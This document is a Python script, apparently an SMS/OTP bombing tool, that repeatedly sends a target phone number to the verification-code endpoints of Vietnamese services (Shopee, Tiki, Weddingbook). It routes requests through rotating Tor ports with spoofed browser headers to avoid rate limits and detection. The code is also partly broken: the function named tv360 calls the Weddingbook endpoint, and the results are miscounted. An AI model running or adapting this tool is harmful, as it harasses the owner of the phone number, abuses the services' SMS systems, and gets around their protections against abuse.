import string
import asyncio
import aiohttp
import ssl
import sys
import re
import time
import random
from datetime import datetime
import json
from copy import deepcopy

try:
    from aiohttp_socks import ProxyConnector
    SOCKS_AVAILABLE = True
except ImportError:
    print("⚠️  aiohttp-socks chưa cài đặt. Chỉ chạy Direct connection.")
    print("   Cài đặt: pip install aiohttp-socks")
    SOCKS_AVAILABLE = False

ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

from fake_useragent import UserAgent

class SmartUserAgentPool:
    """Pool User Agents thông minh với rotation và context awareness"""
    
    def __init__(self):
        self.ua_generator = UserAgent()
                
        self.ua_pools = {
            'desktop_chrome': [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            ],
            'desktop_firefox': [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
            ],
            'mobile_chrome': [
                'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.0.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
            ],
            'tor_safe': [
                'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0'
            ]
        }
        
        self.used_agents = {}
        
    def get_smart_agent(self, connection_type="direct", service_name="", request_type="api"):
    
        if connection_type == "tor":
            # Tor nên dùng Firefox để blend in
            pool_key = 'tor_safe'
        elif request_type == "mobile":
            pool_key = 'mobile_chrome'
        elif "api" in request_type.lower():
            pool_key = 'desktop_chrome'  # API thường expect desktop
        else:
            pool_key = random.choice(['desktop_chrome', 'desktop_firefox'])
        cache_key = f"{service_name}_{connection_type}_{pool_key}"
        
        if cache_key not in self.used_agents:
            agent_pool = self.ua_pools[pool_key]
            selected_agent = random.choice(agent_pool)
            self.used_agents[cache_key] = selected_agent
        
        return self.used_agents[cache_key]

    def get_matching_headers(self, base_headers, connection_type, service_name="", request_type="api"):
        headers = deepcopy(base_headers)
        
        user_agent = self.get_smart_agent(connection_type, service_name, request_type)
        
        for key in list(headers.keys()):
            if key.lower() == 'user-agent':
                del headers[key]
        headers['User-Agent'] = user_agent
        
        if connection_type == "tor":
            headers.update({
                'DNT': '1',
                'Upgrade-Insecure-Requests': '1',
            })
            
            if 'Firefox' in user_agent:
                headers.update({
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin'
                })
        else:
            if 'Chrome' in user_agent:
                headers.update({
                    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"'
                })
        
        return headers

class FlexibleRequestRacer:    
    def __init__(self, ua_pool: SmartUserAgentPool):
        self.ua_pool = ua_pool
    
    async def smart_dual_race(self, method, url, session_direct, session_tor, 
                             service_name="unknown", request_type="api", **kwargs):
        
        async def execute_request(session, connection_type):
            
            max_retries = 2 if connection_type == "direct" else 3  # Tor cần retry nhiều hơn
            
            for attempt in range(max_retries):
                try:
                    request_kwargs = {}
                    for key, value in kwargs.items():
                        if isinstance(value, (dict, list)):
                            request_kwargs[key] = deepcopy(value)
                        else:
                            request_kwargs[key] = value
                    
                    base_headers = request_kwargs.get('headers', {})
                    optimized_headers = self.ua_pool.get_matching_headers(
                        base_headers, connection_type, service_name, request_type
                    )
                    request_kwargs['headers'] = optimized_headers
                    
                    # Timeout dynamic
                    base_timeout = 8 if connection_type == "direct" else 12
                    timeout = aiohttp.ClientTimeout(
                        total=base_timeout + (attempt * 3),
                        connect=4 + (attempt * 2)
                    )
                    request_kwargs['timeout'] = timeout
                    
                    # Retry delay
                    if attempt > 0:
                        delay = random.uniform(0.5, 2.0) * (attempt + 1)
                        await asyncio.sleep(delay)
                        print(f"      🔄 {connection_type.title()} retry {attempt+1}/{max_retries}")
                    
                    # Execute request
                    start_time = time.time()
                    async with session.request(method, url, **request_kwargs) as response:
                        elapsed = time.time() - start_time
                        
                        # Read response
                        try:
                            if 'application/json' in response.headers.get('content-type', ''):
                                response_data = await response.json()
                            else:
                                response_data = await response.text()
                        except:
                            response_data = await response.text()
                        
                        result = {
                            'status': response.status,
                            'data': response_data,
                            'headers': dict(response.headers),
                            'connection_type': connection_type,
                            'elapsed': elapsed,
                            'url': str(response.url),
                            'method': method,
                            'attempt': attempt + 1
                        }
                        
                        # Success criteria
                        if response.status in [200, 201, 202, 204, 302]:
                            if attempt > 0 or elapsed > 2:
                                print(f"      ✅ {connection_type.title()} OK ({elapsed:.2f}s, attempt {attempt+1})")
                            return result
                        
                        elif response.status in [429, 503]:  # Rate limit
                            print(f"      ⚠️ {connection_type.title()} rate limited: {response.status}")
                            if attempt < max_retries - 1:
                                await asyncio.sleep(random.uniform(2, 5))
                                continue
                        
                        elif response.status >= 400:
                            print(f"      ❌ {connection_type.title()} error {response.status}")
                            if attempt == max_retries - 1:
                                return result  # Return even error for analysis
                        
                except asyncio.TimeoutError:
                    print(f"      ⏰ {connection_type.title()} timeout (attempt {attempt+1})")
                except Exception as e:
                    error_msg = str(e)[:60]
                    print(f"      ❌ {connection_type.title()} exception: {error_msg}")
                    
                    if attempt == max_retries - 1:
                        return {
                            'status': None,
                            'data': str(e),
                            'connection_type': connection_type,
                            'error': True,
                            'elapsed': 0
                        }
            
            return None
        
        tasks = []
        
        # Direct task
        direct_task = asyncio.create_task(
            execute_request(session_direct, "direct"),
            name=f"{service_name}_direct"
        )
        tasks.append(direct_task)
        
        if session_tor is not None:
            tor_task = asyncio.create_task(
                execute_request(session_tor, "tor"),
                name=f"{service_name}_tor"
            )
            tasks.append(tor_task)
        
        try:
            done, pending = await asyncio.wait(
                tasks,
                return_when=asyncio.FIRST_COMPLETED,
                timeout=15  # Global timeout
            )
            
            # Process winner
            winner_result = None
            for task in done:
                if not task.exception():
                    result = task.result()
                    if result and result.get('status') in [200, 201, 202, 204, 302]:
                        winner_result = result
                        break
            
            # Cancel losers
            for task in pending:
                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass
            
            # Return winner or best available
            if winner_result:
                return winner_result
            
            # Nếu không có winner, lấy result tốt nhất từ done tasks
            for task in done:
                if not task.exception():
                    result = task.result()
                    if result:
                        return result
            
            # Last resort: wait for pending
            if pending:
                print(f"      🔄 Chờ {len(pending)} connection chậm hơn...")
                remaining = await asyncio.gather(*pending, return_exceptions=True)
                for result in remaining:
                    if isinstance(result, dict) and result.get('status'):
                        return result
        
        except asyncio.TimeoutError:
            print(f"      ⏰ Global timeout for {service_name}")
        except Exception as e:
            print(f"      ❌ Race error for {service_name}: {e}")
        finally:
            # Cleanup
            for task in tasks:
                if not task.done():
                    task.cancel()
                    try:
                        await task
                    except asyncio.CancelledError:
                        pass
        
        raise Exception(f"All connections failed for {service_name}")

# Tor Manager
class AsyncTorManager:
    def __init__(self):
        self.tor_configs = [
            {'proxy_port': 9050},
            {'proxy_port': 9051},
            {'proxy_port': 9052},
            {'proxy_port': 9053},
            {'proxy_port': 10050},
            {'proxy_port': 10051},
            {'proxy_port': 10052},
            {'proxy_port': 10053}            
        ]
        self.current_sessions = {'direct': None, 'tor': None}

    async def get_sessions(self, iteration):
        # Direct session
        connector_direct = aiohttp.TCPConnector(
            ssl=ssl_context,
            limit=15,
            ttl_dns_cache=300,
            use_dns_cache=True,
            keepalive_timeout=30
        )
        direct_session = aiohttp.ClientSession(
            connector=connector_direct,
            timeout=aiohttp.ClientTimeout(total=20, connect=10),
            connector_owner=True
        )

        # Tor session
        tor_session = None
        tor_proxy = None
        
        if SOCKS_AVAILABLE:
            cycle_position = iteration % len(self.tor_configs)
            config = self.tor_configs[cycle_position]
            
            try:
                connector_tor = ProxyConnector.from_url(f"socks5://127.0.0.1:{config['proxy_port']}")
                tor_session = aiohttp.ClientSession(
                    connector=connector_tor,
                    timeout=aiohttp.ClientTimeout(total=25, connect=15),
                    connector_owner=True
                )
                tor_proxy = config['proxy_port']
                print(f"  🔗 Sessions: Direct + Tor port {config['proxy_port']}")
            except Exception as e:
                print(f"  ⚠️ Tor setup failed: {e}")
                tor_session = None
        else:
            print(f"  🔗 Sessions: Direct only (Tor unavailable)")

        self.current_sessions = {
            'direct': direct_session,
            'tor': tor_session,
            'tor_proxy': tor_proxy
        }

        return direct_session, tor_session, tor_proxy

    async def close_sessions(self):
        if self.current_sessions['direct']:
            await self.current_sessions['direct'].close()
        if self.current_sessions['tor']:
            await self.current_sessions['tor'].close()

ua_pool = SmartUserAgentPool()
request_racer = FlexibleRequestRacer(ua_pool)
tor_manager = AsyncTorManager()

def handle_request_error(service_name):
    def decorator(func):
        async def wrapper(*args, **kwargs):
            try:
                result = await func(*args, **kwargs)
                return {
                    'service': service_name,
                    'status': result['status'],
                    'connection': result['connection_type'],
                    'response': str(result['data'])[:100],
                    'success': result['status'] in [200, 201, 202]
                }
            except Exception as e:
                return {
                    'service': service_name,
                    'status': None,
                    'connection': 'failed',
                    'response': str(e)[:100],
                    'success': False
                }
        return wrapper
    return decorator

def generate_random_email(domain='gmail.com'):
    length = random.randint(6, 12)
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return f'{name}@{domain}'

def generate_random_name():
    first_names = ['Nguyễn', 'Trần', 'Lê', 'Phạm', 'Hoàng', 'Vũ', 'Đặng', 'Bùi']
    middle_names = ['Văn', 'Thị', 'Quang', 'Anh', 'Minh', 'Thanh', 'Hồng', 'Thu']
    last_names = ['Nam', 'Hương', 'Long', 'Linh', 'Duy', 'Mai', 'Hà', 'Tuấn']
    
    return f"{random.choice(first_names)} {random.choice(middle_names)} {random.choice(last_names)}"

async def tv360(sdt, direct_session, tor_session, tor_proxy):    
    cookies = {
        'img-ext': 'avif',
        'NEXT_LOCALE': 'vi',
        'device-id': f's%3Aweb_{random.randint(100000, 999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}.{random.randint(100000000000000000000000000000, 999999999999999999999999999999)}',
        'session-id': f's%3A{random.randint(100000000, 999999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}.{random.randint(100000000000000000000000000000, 999999999999999999999999999999)}',
        'G_ENABLED_IDPS': 'google',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://tv360.vn',
        'referer': 'https://tv360.vn/login',
        'starttime': str(int(time.time() * 1000)),
        'tz': 'Asia/Ho_Chi_Minh',

    }

    json_data = {'msisdn': sdt}

    result = await request_racer.smart_dual_race(
        'POST', 
        f'https://www.weddingbook.vn/api/public/authcall/+84.{sdt}',
        direct_session, 
        tor_session,
        service_name='weddingbook',
        request_type='api',
        headers=headers,
        cookies=cookies
    )
    return result
                
async def weddingbook(sdt, direct_session, tor_session, tor_proxy):

    
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'origin': 'https://www.weddingbook.vn',
        'referer': 'https://www.weddingbook.vn/recovery/password',
    }
    
    cookies = {'next-i18next': 'vi'}

    try:       
        result = await request_racer.smart_dual_race(
            'POST', 
            f'https://www.weddingbook.vn/api/public/authcall/+84.{sdt}',
            direct_session, 
            tor_session,
            service_name='weddingbook',
            request_type='api',
            headers=headers,
            cookies=cookies
        )               
    except Exception as e:
        return

async def shopee(sdt, direct_session, tor_session, tor_proxy):
    
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://shopee.vn',
        'referer': 'https://shopee.vn/buyer/login',
        'x-api-source': 'pc',
        'x-requested-with': 'XMLHttpRequest',
        'x-shopee-language': 'vi',
        'x-sz-sdk-version': '1.10.15',
    }
    
    form_data = {
        'phone': sdt,
        'type': '1',
        'support_ivr': 'true',
        'pre_type': '1'
    }

    try:       
        result = await request_racer.smart_dual_race(
            'POST', 
            'https://shopee.vn/api/v4/account/send_code',
            direct_session, 
            tor_session,
            service_name='shopee',
            request_type='web_form',
            headers=headers,
            data=form_data  # Form data instead of JSON
        )
                
    except Exception as e:
        return

async def tiki(sdt, direct_session, tor_session, tor_proxy):
    
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://tiki.vn',
        'referer': 'https://tiki.vn/customer/account/login',
        'tiki-api': '1',
        'x-guest-token': f'guest_{random.randint(1000000000, 9999999999)}',
    }
    
    json_data = {
        'phone_number': sdt,
        'type': 'registration',
        'is_dependency': False
    }

    try:       
        result = await request_racer.smart_dual_race(
            'POST', 
            'https://tiki.vn/api/v2/customers/otp_codes',
            direct_session, 
            tor_session,
            service_name='tiki',
            request_type='mobile',  # This will use mobile UA
            headers=headers,
            json=json_data
        )        
        
    except Exception as e:
        return

async def run(phone, i):
    
    direct_session, tor_session, tor_proxy = await tor_manager.get_sessions(i)

    services = [
        tv360,
        weddingbook, 
        shopee,
        tiki
    ]
    
    tasks = [service(phone, direct_session, tor_session, tor_proxy) for service in services]
    
    try:
        results = await asyncio.wait_for(
            asyncio.gather(*tasks, return_exceptions=True),
            timeout=30  # Total timeout for all services
        )
        
        # Process results
        successful = 0
        failed = 0
        
        for result in results:
            if isinstance(result, Exception):
                failed += 1
            elif isinstance(result, dict):
                if result['success']:
                    successful += 1
                else:
                    failed += 1
            else:
                failed += 1
        
        return successful, failed
        
    except asyncio.TimeoutError:
        print(f"  ⏰ Global timeout reached for {phone}")
        return 0, len(services)
    finally:
        await tor_manager.close_sessions()

async def main():
    if len(sys.argv) < 3:
        print(f'Usage: python3 {sys.argv[0]} <phone_number> <count>')
        sys.exit(1)

    phone = sys.argv[1].strip()
    try:
        count = int(sys.argv[2].strip())
    except ValueError:
        print("Error: Count must be a number")
        sys.exit(1)

    try:
        for i in range(1, count + 1):
            print(f'[LẦN {i}] ')
            await run(phone, i)
            if i < count:
                await asyncio.sleep(1)
    except Exception as e:
        print(f"❌ Main error: {e}")
    finally:
        await tor_manager.close_sessions()

    print("\n🎉 Đã hoàn tất")

if __name__ == "__main__":
    asyncio.run(main())